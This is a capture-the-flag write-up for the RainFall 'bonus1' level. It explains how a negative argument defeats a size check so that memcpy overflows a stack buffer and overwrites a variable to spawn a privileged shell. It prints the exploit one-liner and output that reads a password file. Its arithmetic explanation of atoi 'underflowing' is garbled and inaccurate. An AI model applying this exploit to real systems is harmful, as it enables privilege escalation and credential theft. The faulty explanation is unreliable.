bonus1
======

*	We spawn with a [bonus1](src/bonus1) executable
	```console
	bonus1@RainFall:~$ ls -l 
	total 8
	-rwsr-s---+ 1 bonus2 users 5043 Mar  6  2016 bonus1
	bonus1@RainFall:~$ ./bonus1 
	Segmentation fault (core dumped)
	```
*	I used Ghidra and made the code a bit cleaner [here](src/bonus1.c), let's see what we have:
	- only `main()`
	- buffer of `40 bytes`
	- `atoi()` on `argv[1]` assigned to `x`
	- if `input < 10` `memcpy(buffer, argv[2], x*4)`
	- if `x == 0x574f4c46` than execute a shell
*	This one is a bit tricky but not hard. 
	1. First of all no shellcode or ret2 since we have the execution inside of the code
	2. `argv[1]` is `x` and cannot be less than 10 but has to be equal to `0x574f4c46(HEX)`
	3. `buffer` and `x` are next to eachother in the memory so we should be able to access it if overflowing 
	4. `memcpy()` is vulnerable to overflow since we have access to the size of it 
	5. Normally we shouldn't be able to overflow since x has to be less than 10 `(x*4)`and our buffer has 40 bytes of size
	6. BUT there is a way to get a higher value than 10 (11 should be enough since we only need 40 to overflow and 4 for the address of x), we just need to trick `atoi()` with an `underflow`
*	When giving `atoi()` a too big or too small value, it under/overflows back to zero, for exemple -> `SIZE_MIN(-2147483648) - 11) = 11`
*	So we should be able to give `-2147483636` as `argv[1]` to get `11`. Next we want `40 bytes` of padding and then the value needed for x `0x574f4c46`, let's try this :
	```
	bonus1@RainFall:~$ ./bonus1 -2147483636 $(python -c 'print("A" * 40 + "\x57\x4f\x4c\x46"[::-1])')
	$ whoami
	bonus2
	$ cat /home/user/bonus2/.pass
	579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
	```